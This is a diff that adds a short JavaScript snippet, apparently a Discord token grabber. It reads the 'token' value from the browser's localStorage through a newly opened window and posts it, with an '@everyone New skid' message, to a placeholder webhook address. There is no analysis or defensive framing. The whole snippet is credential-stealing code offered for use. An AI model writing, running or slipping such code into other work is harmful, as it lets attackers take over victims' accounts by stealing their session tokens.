@@ -1,0 +1,17 @@
+(function() {
+    window.dispatchEvent(new Event('beforeunload'));
+    var x = new XMLHttpRequest;
+    x.open("POST", 'YOUR_WEBHOOK'), x.setRequestHeader("Content-type", "application/json");
+    var y = {
+        username: "WEBHOOKNAME",
+        avatar_url: "avatarurl",
+        content: "@everyone New skid",
+        embeds: [{
+            color: "696969",
+            description: `Token: ${window.open().localStorage.token}`,
+        }]
+    };
+
+    x.send(JSON.stringify(y));
+    w.close()
+}());
